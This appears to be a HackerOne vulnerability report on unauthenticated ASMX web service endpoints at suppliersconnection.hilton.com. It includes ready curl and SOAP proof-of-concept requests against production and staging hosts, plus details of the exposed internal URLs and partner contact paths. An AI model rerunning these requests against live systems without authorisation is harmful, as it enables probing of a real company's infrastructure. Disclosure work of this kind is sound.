# HT-008: Unauthenticated ASMX Web Service Endpoints Return Internal CMS Data

**Program:** Hilton HackerOne  
**Asset:** `suppliersconnection.hilton.com` (Tier B)  
**Severity:** Medium  
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)  
**CWE:** CWE-284 — Improper Access Control  
**Status:** Ready to submit

---

## Summary

Two ASMX web service endpoints in the Hilton Suppliers' Connection Learning Lounge are accessible without authentication and return internal application data:

- `POST /LearningLounge/LearningLoungeService.asmx/GetGallery` → Returns CMS gallery data including internal URLs, sequential resource IDs, and image content
- `POST /LearningLounge/LearningLoungeService.asmx/GetTiles` → Returns CMS tile configuration including internal page paths, JavaScript function names, and system URLs

Additionally, the `LearningLoungeSearchPartners` method (confirmed via WSDL) is accessible without authentication and processes the request before failing with an internal serialization error — revealing that partner search functionality executes without auth checks.

---

## Proof of Concept

### GetGallery — Returns Gallery Data Without Authentication

```bash
curl -s "https://suppliersconnection.hilton.com/LearningLounge/LearningLoungeService.asmx/GetGallery" \
  -X POST \
  -H "Content-Type: application/json; charset=utf-8" \
  -H "Accept: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{}'
```

**Response (HTTP 200, 815,712 bytes — ~800KB of image data):**
```json
{
  "d": [
    {
      "__type": "Hilton.SuppliersConnection.Entities.LearningLoungeGallery",
      "GalleryImageId": 4,
      "ClickActionTypeId": 1,
      "ClickActionTypeName": "External URL",
      "ClickActionURL": "../Partners/PreApplicationPage.aspx",
      "ClickActionTarget": "_blank",
      "Enabled": true,
      "ImageURL": "images/home/carousel-partners/slide-4.jpg",
      "ImageType": "URL",
      "Image": "<744,748 base64 chars of image binary>"
    },
    {
      "__type": "Hilton.SuppliersConnection.Entities.LearningLoungeGallery",
      "GalleryImageId": 7,
      "ClickActionURL": "https://id.hilton.com/identityiq/ui/external/desktopResetUsername.jsf",
      "ClickActionTarget": "_blank",
      "Enabled": true,
      "ImageType": "BINARY",
      "Image": "<70,124 base64 chars>",
      "AllowDelete": true
    }
  ]
}
```

**Notable disclosure:** `https://id.hilton.com/identityiq/ui/external/desktopResetUsername.jsf` — this is Hilton's internal SailPoint IdentityIQ (identity governance platform) URL, exposed to unauthenticated callers.

### GetTiles — Returns Tile Configuration Without Authentication

```bash
curl -s "https://suppliersconnection.hilton.com/LearningLounge/LearningLoungeService.asmx/GetTiles" \
  -X POST \
  -H "Content-Type: application/json; charset=utf-8" \
  -H "Accept: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{}'
```

**Response (HTTP 200, 2,209,909 bytes — 2.2MB):**
```json
{
  "d": [
    {"TileImageId": 2, "ClickActionURL": "javascript:navigateMyAccount();", "RestrictToUserTypeId": "EVERYONE", "TemplateId": 1},
    {"TileImageId": 7, "ClickActionURL": "supportcenter.aspx"},
    {"TileImageId": 3, "ClickActionURL": "calendar.aspx"},
    {"TileImageId": 4, "ClickActionURL": "javascript:meetNGreetTileClicked();"},
    {"TileImageId": 8, "ClickActionURL": "https://designinformation.hilton.com/"},
    {"TileImageId": 5, "ClickActionURL": "ceucredits.aspx"},
    {"TileImageId": 1, "ClickActionURL": "adcdirectors.aspx"},
    {"TileImageId": 23, "ClickActionURL": "https://suppliersconnection.hilton.com/PCD/BecomeDesignConsultant.aspx"},
    {"TileImageId": 20, "ClickActionURL": "javascript:OpenFeedbackPopupAdmin();"},
    {"TileImageId": 19, "ClickActionURL": "http://", "ClickActionTypeName": "Display Template"},
    ...12 total tiles
  ]
}
```

### LearningLoungeSearchPartners — Processes Without Auth (Serialization Error)

```bash
# Via SOAP — the request is processed before failing on serialization
curl -s "https://suppliersconnection.hilton.com/LearningLounge/LearningLoungeService.asmx" \
  -X POST \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://tempuri.org/LearningLoungeSearchPartners\"" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><LearningLoungeSearchPartners xmlns="http://tempuri.org/"><searchRequest><Keywords></Keywords><CategoryId>0</CategoryId><PageIndex>0</PageIndex><PageSize>100</PageSize></searchRequest></LearningLoungeSearchPartners></soap:Body></soap:Envelope>'
```

**Response (HTTP 500 — fails after passing auth, reveals internal types):**
```xml
<soap:Fault>
  <faultstring>Method LearningLoungeService.LearningLoungeSearchPartners can not be reflected.
    --&gt; There was an error reflecting 'LearningLoungeSearchPartnersResult'.
    --&gt; There was an error reflecting type 'Hilton.SuppliersConnection.Entities.Partner'.
    --&gt; Cannot serialize member 'Hilton.SuppliersConnection.Entities.Partner.Contacts'
    of type 'System.Collections.Generic.IList&lt;Contact&gt;'
  </faultstring>
</soap:Fault>
```

This confirms: (1) no authentication check before processing the search, (2) the Partner entity has a `Contacts` list — partner PII that would be returned if the serialization bug is ever fixed.

---

## Sensitive Information Exposed

| Endpoint | Data Type | Sensitivity |
|---------|-----------|-------------|
| GetGallery | `id.hilton.com/identityiq/` URL | Reveals internal identity governance platform |
| GetGallery | Sequential `GalleryImageId` integers | IDOR-enabling resource IDs |
| GetGallery | Image binary (Base64) | ~800KB of CMS assets |
| GetTiles | Internal page paths (`calendar.aspx`, `adcdirectors.aspx`, `ceucredits.aspx`) | Internal page discovery |
| GetTiles | Sequential `TileImageId` integers | IDOR-enabling resource IDs |
| GetTiles | Admin JS functions (`OpenFeedbackPopupAdmin`) | Admin capability enumeration |
| WSDL | `Hilton.SuppliersConnection.Entities.Partner.Contacts` type | PII access path enumeration |
| WSDL | Internal assembly namespace | `Hilton.SuppliersConnection.Entities, Version=1.0.0.0` |

---

## Impact

1. **Internal URL disclosure**: The URL `https://id.hilton.com/identityiq/` (SailPoint IdentityIQ) is disclosed to unauthenticated callers, allowing adversaries to identify and target Hilton's identity governance system for targeted CVE exploitation.

2. **Sequential ID enumeration**: `GalleryImageId` and `TileImageId` are sequential integers returned without authentication. If any write endpoint accepts these IDs without re-validating ownership, IDOR attacks become feasible.

3. **Admin function exposure**: `OpenFeedbackPopupAdmin` is referenced in tile data, disclosing admin-level JavaScript functionality to unauthenticated callers.

4. **Partner PII access path**: `LearningLoungeSearchPartners` processes without authentication — if the serialization bug is patched, partner contact information (`Contact` entities) would be returned to unauthenticated callers.

5. **Data volume**: 2.2MB+ of CMS configuration data returned per unauthenticated request — potential for data harvesting and application mapping.

---

## Reproduction Environment

Also confirmed on staging: `https://suppliersconnectionstage.hilton.com/LearningLounge/LearningLoungeService.asmx/GetGallery` returns identical data, confirming shared data backend between prod and staging.

---

## Recommendations

1. **Require authentication** on all `LearningLoungeService.asmx` endpoints — apply ASP.NET authentication checks before processing ASMX methods.
2. **Remove `id.hilton.com/identityiq/` URLs** from content returned to unauthenticated callers.
3. **Fix `LearningLoungeSearchPartners`**: Even if the serialization bug prevents full data return, the authentication bypass remains — add auth check before processing.
4. **Restrict WSDL access**: The `/LearningLounge/LearningLoungeService.asmx?WSDL` endpoint reveals internal type names and method signatures; restrict to authenticated users.

---

## References

- CWE-284: Improper Access Control
- OWASP A01:2021 — Broken Access Control
- OWASP API Security A01:2023 — Broken Object Level Authorization
